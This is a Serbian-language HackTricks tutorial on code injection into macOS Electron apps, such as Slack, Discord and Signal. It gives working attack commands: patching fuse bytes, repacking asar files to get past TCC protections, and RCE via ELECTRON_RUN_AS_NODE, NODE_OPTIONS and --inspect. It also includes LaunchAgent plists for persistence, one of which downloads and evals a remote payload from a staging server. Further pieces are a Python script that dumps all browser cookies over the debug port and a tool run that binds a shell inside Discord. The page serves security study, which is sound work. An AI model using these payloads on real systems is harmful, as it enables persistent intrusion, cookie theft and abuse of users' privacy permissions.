# Injekcija macOS Electron aplikacija

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne informacije

Ako ne znate šta je Electron, možete pronaći [**mnogo informacija ovde**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Ali za sada samo znajte da Electron pokreće **node**.\
I node ima neke **parametre** i **env promenljive** koje se mogu koristiti da bi se **izvršio drugi kod** osim navedene datoteke.

### Elektronski osigurači

Ove tehnike će biti razmatrane u nastavku, ali u poslednje vreme Electron je dodao nekoliko **sigurnosnih zastava kako bi ih sprečio**. To su [**Elektronski osigurači**](https://www.electronjs.org/docs/latest/tutorial/fuses) i ovo su oni koji se koriste da **spreče** Electron aplikacije u macOS-u da **učitavaju proizvoljan kod**:

* **`RunAsNode`**: Ako je onemogućen, sprečava upotrebu env varijable **`ELECTRON_RUN_AS_NODE`** za ubacivanje koda.
* **`EnableNodeCliInspectArguments`**: Ako je onemogućen, parametri poput `--inspect`, `--inspect-brk` neće biti poštovani. Na taj način se izbegava ubacivanje koda.
* **`EnableEmbeddedAsarIntegrityValidation`**: Ako je omogućeno, učitana **`asar`** **datoteka** će biti **validirana** od strane macOS-a. Na ovaj način se **sprečava** ubacivanje koda **modifikovanjem sadržaja ove datoteke**.
* **`OnlyLoadAppFromAsar`**: Ako je ovo omogućeno, umesto pretrage za učitavanje u sledećem redosledu: **`app.asar`**, **`app`** i na kraju **`default_app.asar`**. Proveravaće i koristiće samo app.asar, čime se obezbeđuje da kada se **kombinuje** sa osiguračem **`embeddedAsarIntegrityValidation`** bude **nemoguće** učitati nevalidiran kod.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Ako je omogućeno, proces pregledača koristi datoteku nazvanu `browser_v8_context_snapshot.bin` za svoj V8 snimak.

Još jedan interesantan osigurač koji neće sprečiti ubacivanje koda je:

* **EnableCookieEncryption**: Ako je omogućeno, skladište kolačića na disku je enkriptovano korišćenjem kriptografskih ključeva nivoa OS-a.

### Provera Elektronskih osigurača

Možete **proveriti ove zastave** iz aplikacije sa:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifikacija Elektron Fjuzova

Kako [**dokumentacija navodi**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija **Elektron Fjuzova** je podešena unutar **Elektron binarnog koda** koji negde sadrži string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

U macOS aplikacijama, ovo se obično nalazi u `aplikacija.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Možete učitati ovaj fajl na [https://hexed.it/](https://hexed.it/) i pretražiti prethodni string. Nakon ovog stringa možete videti u ASCII formatu broj "0" ili "1" koji pokazuje da li je svaka osigurač isključen ili uključen. Samo izmenite heksadecimalni kod (`0x30` je `0` i `0x31` je `1`) da **izmenite vrednosti osigurača**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Imajte na umu da ako pokušate **prepisati** **binarni fajl Electron Framework-a** unutar aplikacije sa ovim izmenjenim bajtovima, aplikacija neće raditi.

## RCE dodavanje koda u Electron aplikacije

Mogu postojati **spoljni JS/HTML fajlovi** koje koristi Electron aplikacija, tako da napadač može ubaciti kod u ove fajlove čiji potpis neće biti proveren i izvršiti proizvoljan kod u kontekstu aplikacije.

{% hint style="danger" %}
Međutim, trenutno postoje 2 ograničenja:

* Potrebna je dozvola **`kTCCServiceSystemPolicyAppBundles`** da bi se izmenila aplikacija, tako da po defaultu ovo više nije moguće.
* Kompajlirani **`asap`** fajl obično ima osigurače **`embeddedAsarIntegrityValidation`** `i` **`onlyLoadAppFromAsar`** `omogućene`

Što ovaj put napada čini složenijim (ili nemogućim).
{% endhint %}

Imajte na umu da je moguće zaobići zahtev za **`kTCCServiceSystemPolicyAppBundles`** kopiranjem aplikacije u drugi direktorijum (kao što je **`/tmp`**), preimenovanjem foldera **`app.app/Contents`** u **`app.app/NotCon`**, **izmenom** **asar** fajla sa vašim **zlonamernim** kodom, ponovnim preimenovanjem nazad u **`app.app/Contents`** i izvršavanjem.

Možete otpakovati kod iz asar fajla sa:
```bash
npx asar extract app.asar app-decomp
```
I zapakujte ga nazad nakon što ste ga izmenili sa:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE sa `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Prema [**dokumentaciji**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), ako je ova env promenljiva postavljena, pokrenuće proces kao običan Node.js proces.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Ako je osigurač **`RunAsNode`** onemogućen, promenljiva okoline **`ELECTRON_RUN_AS_NODE`** će biti ignorisana, i ovo neće raditi.
{% endhint %}

### Injekcija iz App Plist-a

Kao što je [**predloženo ovde**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), možete zloupotrebiti ovu promenljivu okoline u plist datoteci da biste održali postojanost:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE sa `NODE_OPTIONS`

Možete sačuvati payload u drugom fajlu i izvršiti ga:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Ako je osigurač **`EnableNodeOptionsEnvironmentVariable`** **onemogućen**, aplikacija će **ignorisati** env var **NODE\_OPTIONS** prilikom pokretanja osim ako je postavljena env varijabla **`ELECTRON_RUN_AS_NODE`**, koja će takođe biti **ignorisana** ako je osigurač **`RunAsNode`** onemogućen.

Ako ne postavite **`ELECTRON_RUN_AS_NODE`**, dobićete **grešku**: `Većina NODE_OPTIONa nije podržana u pakovanim aplikacijama. Pogledajte dokumentaciju za više detalja.`
{% endhint %}

### Injekcija iz App Plist-a

Možete zloupotrebiti ovu env varijablu u plist datoteci da biste održali upornost dodavanjem ovih ključeva:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE sa inspekcijom

Prema [**ovom**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) izvoru, ako pokrenete Electron aplikaciju sa zastavicama poput **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **otvoren će biti debug port** na koji možete da se povežete (na primer iz Chrome-a na `chrome://inspect`) i bićete u mogućnosti da **ubacite kod u nju** ili čak pokrenete nove procese.\
Na primer:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Ako je osigurač **`EnableNodeCliInspectArguments`** onemogućen, aplikacija će **ignorisati node parametre** (kao što su `--inspect`) prilikom pokretanja osim ako je postavljena promenljiva okruženja **`ELECTRON_RUN_AS_NODE`**, koja će takođe biti **ignorisana** ako je osigurač **`RunAsNode`** onemogućen.

Međutim, i dalje možete koristiti **electron parametar `--remote-debugging-port=9229`** ali prethodni payload neće raditi za izvršavanje drugih procesa.
{% endhint %}

Korišćenjem parametra **`--remote-debugging-port=9222`** moguće je ukrasti neke informacije iz Electron aplikacije poput **istorije** (sa GET komandama) ili **kolačića** pregledača (jer su **dekriptovani** unutar pregledača i postoji **json endpoint** koji će ih dati).

Možete naučiti kako to uraditi [**ovde**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**ovde**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) i koristiti automatski alat [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ili jednostavan skript kao:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
U [**ovom blog postu**](https://hackerone.com/reports/1274695), ovaj debagovanje je zloupotrebljen da bi headless chrome **preuzeo proizvoljne datoteke na proizvoljne lokacije**.

### Injekcija iz App Plist datoteke

Mogli biste zloupotrebiti ovu env promenljivu u plist datoteci da biste održali upornost dodavanjem ovih ključeva:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Bajpasovanje TCC-a zloupotrebom starijih verzija

{% hint style="success" %}
TCC daemon sa macOS-a ne proverava izvršenu verziju aplikacije. Dakle, ako **ne možete ubaciti kod u Electron aplikaciju** pomoću bilo koje od prethodnih tehnika, možete preuzeti prethodnu verziju APLIKACIJE i ubaciti kod u nju jer će i dalje dobiti TCC privilegije (osim ako Trust Cache to sprečava).
{% endhint %}

## Pokretanje ne-JS koda

Prethodne tehnike će vam omogućiti da pokrenete **JS kod unutar procesa elektronske aplikacije**. Međutim, zapamtite da **podprocesi pokreću isti sandbox profil** kao roditeljska aplikacija i **nasleđuju njihove TCC dozvole**.\
Stoga, ako želite zloupotrebiti privilegije da pristupite kameri ili mikrofonu na primer, jednostavno možete **pokrenuti drugi binarni fajl iz procesa**.

## Automatsko ubacivanje

Alatka [**electroniz3r**](https://github.com/r3ggi/electroniz3r) može se lako koristiti za **pronalaženje ranjivih elektronskih aplikacija** instaliranih i ubacivanje koda u njih. Ovaj alat će pokušati koristiti tehniku **`--inspect`**:

Morate je sami kompajlirati i možete je koristiti na ovaj način:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Reference

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Učite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
